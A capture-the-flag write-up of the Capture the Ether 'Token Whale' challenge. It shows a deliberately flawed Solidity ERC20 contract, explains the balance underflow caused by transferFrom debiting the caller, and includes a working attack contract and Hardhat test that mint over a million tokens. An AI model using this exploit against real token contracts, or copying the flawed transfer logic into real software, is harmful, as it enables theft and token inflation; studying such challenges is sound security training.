# Catch the Ether 9: Token Whale

Another arithmetic over/underflow ;-) oh, boy. Glad this was fixed in 0.8

## The Task Intro

This ERC20-compatible token is hard to acquire. There’s a fixed supply of 1,000 tokens, all of which are yours to start with. Find a way to accumulate at least 1,000,000 tokens to solve this challenge.

## The Task Code

```apache
pragma solidity ^0.4.21;

contract TokenWhaleChallenge {
    address player;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Simple ERC20 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    function TokenWhaleChallenge(address _player) public {
        player = _player;
        totalSupply = 1000;
        balanceOf[player] = 1000;
    }

    function isComplete() public view returns (bool) {
        return balanceOf[player] >= 1_000_000;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    function _transfer(address to, uint256 value) internal {
        //write balances to state
        balanceOf[msg.sender] -= value; //******************* attack with 1001, and we have an underflow
        balanceOf[to] += value;

        emit Transfer(msg.sender, to, value);
    }

    function transfer(address to, uint256 value) public {
        //check balance of caller/sender is greater than value
        require(balanceOf[msg.sender] >= value);

        //check balance of receiver grater than current before <- no negative values.
        require(balanceOf[to] + value >= balanceOf[to]);

        _transfer(to, value);
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function approve(address spender, uint256 value) public {
        //no check!!!!!
        allowance[msg.sender][spender] = value; //****************************************** attack
        emit Approval(msg.sender, spender, value);
    }

    function transferFrom(address from, address to, uint256 value) public {
        require(balanceOf[from] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);
        require(allowance[from][msg.sender] >= value);

        allowance[from][msg.sender] -= value;
        _transfer(to, value); //************** <- why not from???? very weired, transferFrom will not work.
    }
}

```

## The Solution

I started studying the TokenWhaleChallenge - the checks with transferFrom and transfer looked good, they cannot get overflowed. As well I was not able to change the balanceOf value itself from an attacking contract or direct caller. Suspicious where three things:

1. \_transfer first line substracting the value from balanceOf[msg.sender]
2. approve: no checks are made, I can approve any value
3. transferFrom call to \_transfer(to, value) -> where is the from going? see 1.

I knew the attack needs to be arranged with these elements. I was playing the attack only with the player account and did not succeed. After a research it was clear the attack needs to be done with the smart contract address calling transferFrom with an approval and the from the player and to a thrid party account.

This call substracts in the \_transfer function the value from the sender, causing an underflow.

HEY, and this is the end with capture the ether inside the security week!

🎉️🎉️🎉️🎉️🎉️🎉️🎉️🎉️🎉️🎉️🎉️🎉️🎉️🎉️🎉️🎉️🎉️🎉️🎉️🎉️🎉️🎉️🎉️🎉️🎉️🎉️🎉️🎉️🎉️🎉️🎉️🎉️🎉️🎉️🎉️🎉️🎉️🎉️🎉️🎉️🎉️🎉️🎉️🎉️🎉️🎉️🎉️🎉️🎉️🎉️🎉️🎉️🎉️🎉️🎉️🎉️

```apache
describe('Deployment', function () {
    it('Token Whale', async function () {
      const { crack, tokenWhale, owner, otherAccount } = await loadFixture(deployReentrencyFixture);

      //player approves contract to spend 100 Tokens
      await tokenWhale.approve(crack.address, 100);

      //attack contract sends 100 tokens from from owner with aproval to a third account
      //and then transfer 1 Mio token back
      await crack.attack(owner.address, otherAccount.address);

      //we generated insanely a lot of tokens due to a underflow
      const balance = await tokenWhale.balanceOf(owner.address);
      console.log(balance);
      expect(balance).to.be.equal(1001000);
      console.log('Attack made successfully');

      //check contract is completed
      expect(await tokenWhale.isComplete()).to.be.true;
      console.log('Contract is complete');
    });
  });
```

The contract:

```apache
contract Crack {
    TokenWhaleChallenge twc;
    address player;

    function Crack(TokenWhaleChallenge _twc, address _player) public payable {
        twc = _twc;
        player = _player;
    }

    function attack(address from, address to) external {
        //1. player called allowance on his token <-- happens on javascript side
        //-> client side

        //2. Contract calls transferFrom from player to another address generate overflow
        twc.transferFrom(from, to, 100);

        //3. Transfer 1_000_000 to player
        twc.transfer(player, 1000000);
    }

    function() public payable {}
}
```

a
